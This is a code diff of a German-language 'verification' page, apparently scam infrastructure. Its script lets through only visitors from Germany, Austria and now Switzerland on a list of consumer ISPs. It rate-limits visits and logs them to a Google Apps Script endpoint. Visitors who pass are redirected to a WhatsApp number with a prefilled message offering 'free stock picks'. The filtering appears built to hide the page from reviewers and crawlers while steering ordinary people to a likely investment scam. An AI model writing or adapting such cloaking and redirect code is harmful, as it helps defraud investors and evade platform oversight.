@@ -13,24 +13,28 @@
   <p id="status">Überprüfung läuft...</p>
 
   <script>
+    // 请替换为你的 Google Apps Script 部署URL
     const GOOGLE_SCRIPT_URL = "https://script.google.com/macros/s/AKfycbz4qCLwaA_9X9Kk9tIGwY2G3_MCy7ISQXZDpwiNL7-kzecAb1YnP_v_GBq3JQd14arv5g/exec";
+    // 请替换为你的 WhatsApp 联系链接
     const WHATSAPP_LINK = "https://api.whatsapp.com/send/?phone=491639447584&text=Erhalten+Sie+10+potenzielle+Aktien+kostenlos";
 
-    const ALLOWED_COUNTRIES = ["DE", "AT"];
+    const ALLOWED_COUNTRIES = ["DE", "AT", "CH"];
     const ALLOWED_ISPS = [
-      // 德国运营商
+     
       "Deutsche Telekom", "Telekom", "T-Mobile", "Congstar",
       "Vodafone", "Otelo",
       "Telefónica", "O2", "Blau", "ALDI TALK",
       "1&1", "Drillisch", "winSIM", "smartmobil", "PremiumSIM",
       "Freenet", "Klarmobil", "Lidl Connect",
-      // 奥地利运营商
+      
       "A1 Telekom", "A1", "Magenta Telekom", "Magenta", "T-Mobile Austria",
       "Drei", "Hutchison Drei", "HoT", "Hofer Telekom",
-      "Spusu", "Yesss!", "Educom", "bob", "Liwest", "Lidl Connect"
+      "Spusu", "Yesss!", "Educom", "bob", "Liwest", "Lidl Connect",
+      
+      "Swisscom", "Sunrise", "Salt"
     ];
 
-    const RATE_LIMIT_TIME = 2 * 60 * 1000; // 2 分钟
+    const RATE_LIMIT_TIME = 2 * 60 * 1000; 
     const RATE_LIMIT_MAX = 20;
     const RATE_LIMIT_STORAGE_KEY = "visit_timestamps";
 
@@ -97,13 +101,13 @@
       let jumpStatus = "跳转失败";
 
       if (blockedByRateLimit) {
-        statusText = "访问过于频繁，已被限制访问。";
+        statusText = "Zugriffe zu häufig, Zugriff gesperrt.";
       } else if (!countryAllowed) {
-        statusText = "抱歉，仅允许德国和奥地利访问。";
+        statusText = "Entschuldigung, nur Deutschland, Österreich und Schweiz erlaubt.";
       } else if (!ispAllowed) {
-        statusText = "抱歉，您的网络运营商不被允许访问。";
+        statusText = "Entschuldigung, Ihr Internetanbieter ist nicht erlaubt.";
       } else {
-        statusText = "验证通过，页面即将跳转...";
+        statusText = "Überprüfung erfolgreich, Weiterleitung...";
         jumpStatus = "跳转成功";
       }
 
